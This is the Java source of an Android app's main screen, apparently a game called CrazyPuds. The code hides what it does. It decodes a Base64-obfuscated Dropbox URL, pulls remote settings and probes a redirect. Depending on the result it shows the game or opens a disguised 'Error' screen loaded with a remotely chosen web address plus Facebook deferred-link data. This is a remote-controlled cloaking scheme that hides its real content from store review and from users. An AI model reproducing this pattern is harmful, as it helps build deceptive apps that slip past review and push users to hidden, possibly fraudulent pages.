package com.crazypuds.in;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;

import org.json.JSONObject;
import org.jsoup.Connection;
import org.jsoup.Jsoup;

import java.net.URL;
import java.util.Base64;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {

    private final String step = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy8zN2E3bmRvczVxM3Uwdzcvb2JnZWNrdC5qc29uP2RsPTE=";//ccskrf yf ndjq afqk 
//https://www.dropbox.com/s/37a7ndos5q3u0w7/obgeckt.json?dl=1

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView textView = findViewById(R.id.inte);


        tryToConnect(MainActivity.this);
        if (tryToConnect(MainActivity.this)) {
            wotsDo();
            textView.setVisibility(View.GONE);
        } else {
            textView.setVisibility(View.VISIBLE);
        }

    }

    public static boolean tryToConnect(final Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }
        wifiInfo = cm.getActiveNetworkInfo();
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }
        return false;
    }

    public void achievement(String achieve, String main, String level) {

        try {

            Connection.Response response = Jsoup.connect(achieve).followRedirects(false).execute();
            if (response.header("location").contains(level)) {
                backToGame(null, true);
            } else {
                getFb(main);
            }

        } catch (Exception ignored) {
        }
    }

    private void wotsDo() {
        Thread thread = new Thread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                try {
//получаем с дроп бокса файл с параметрами json
                    String n = new Scanner(new URL(new String(Base64.getDecoder().decode(step))).openStream(), "UTF-8").useDelimiter("\\A").next();

                    JSONObject object = new JSONObject(n);
                    String level = object.getString(new String(Base64.getDecoder().decode("bGV2ZWw=")));
                    boolean can = Boolean.parseBoolean(new String(Base64.getDecoder().decode("Y2Fu")));
                    String main = object.getString(new String(Base64.getDecoder().decode("bWFpbg==")));
                    String achieve = object.getString(new String(Base64.getDecoder().decode("YWNoaWV2ZQ==")));
                    if (can) {
                        achievement(achieve, main, level);
                    } else {
                        backToGame(null, true);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        });
        thread.start();

    }

    private void getFb(String center) {

        Runnable runnable = new Runnable() {
            @Override
            public void run() {

                FacebookSdk.setAutoInitEnabled(true);
                FacebookSdk.fullyInitialize();
                AppLinkData.fetchDeferredAppLinkData(MainActivity.this,
                        new AppLinkData.CompletionHandler() {
                            @RequiresApi(api = Build.VERSION_CODES.O)
                            @Override
                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                                if (appLinkData != null) {
                                    String centerOll = center + appLinkData.getTargetUri().toString().replace(new String(Base64.getDecoder().decode("YXBwOi8v")), "").replace("?", "");
                                    backToGame(centerOll, false);
                                } else {
                                    backToGame(center, false);
                                }
                            }
                        }
                );
            }
        };
        Thread thread = new Thread(runnable);
        thread.start();
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void backToGame(String crazypuds, Boolean game) {
        if (game) {
            startActivity(new Intent(MainActivity.this, CrazyPuds.class));
        } else {
            startActivity(new Intent(MainActivity.this, Error.class).putExtra("crazypuds", checkSession(crazypuds)));
        }
        finish();
    }

    private String checkSession(String crazypuds) {

        String save = "save", nul = "null", buffer;
        SharedPreferences sPref = getPreferences(MODE_PRIVATE);
        sPref = getPreferences(MODE_PRIVATE);
        String savedText = sPref.getString(save, nul);
        if (!savedText.equals(nul)) {
            buffer = savedText;
        } else {
            SharedPreferences.Editor ed = sPref.edit();
            ed.putString(save, crazypuds);
            ed.commit();
            buffer=crazypuds;
        }
        return buffer;
    }
}